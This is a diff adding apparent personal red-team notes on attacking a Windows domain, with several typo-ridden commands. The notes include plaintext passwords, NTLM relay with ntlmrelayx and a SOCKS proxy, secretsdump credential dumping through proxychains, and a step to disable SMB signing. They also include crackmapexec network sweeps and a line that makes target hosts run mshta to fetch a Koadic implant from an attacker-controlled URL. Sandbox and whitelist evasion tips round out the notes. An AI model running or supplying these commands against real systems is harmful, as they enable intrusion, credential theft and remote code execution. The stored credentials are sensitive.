@@ -1,0 +1,82 @@
+admin
+Check@123
+
+user machine
+404hackers
+
+master pwd:
+Enemyofthestate1422$
+
+
+./ntlmrelayx.py -tf targets.txt -smb2support -socks
+
+
+python2, 3..6
+mitm6 responder 
+impacket
+
+
+Disabled, Security settings->Security Options(3 thing)->Mircosoft network Cilent  digital disabled
+
+proxychains 
+
+./ntlmrelyax.py -tf targets.txt -smb2support -scoks
+
+proxychains ./secretdump.py cryptonite/clarek@192.168.56.3
+
+
+nano proxychains
+
+socks4 192.168.56.3 1080
+
+-wh 192.168.56.1 -tf targets.py
+
+./ntlmrelayz.py -wh 192.168.55.1 -t smb://192.168.56.4 -c " " /**execute any command with this c flag
+
+crckmapwebsite
+
+crackmapexec smb 192.168.0.1/24
+
+
+powershell remote
+koatic c2 server
+koadic
+
+
+
+kevin smith talk 
+pass html application, chm files - health files. No browser sandbox detect this, 
+
+crackmapexec 192.168.56.1/24 -u clarke -p Summer2019 --exec-method atexec -x 'mshta http://192.168.56.1:999/Ir3nz'
+
+parrot terminal
+
+
+In mshta: use implant/inject/exec_cmd
+
+
+Marc Rusowhich,  sysinternals
+
+Jim, sandbox bypass guy for windows
+adding malicious websites into trusted website in browser
+
+aplications places system
+
+dpapi - cryptograph for windows
+
+wdigest.dll
+
+silenttrinity
+
+
+vb encoding
+
+application domains in .NET, 
+https://github.com/khr0x40sh/WhiteListEvasion
+
+
+
+
+
+
+
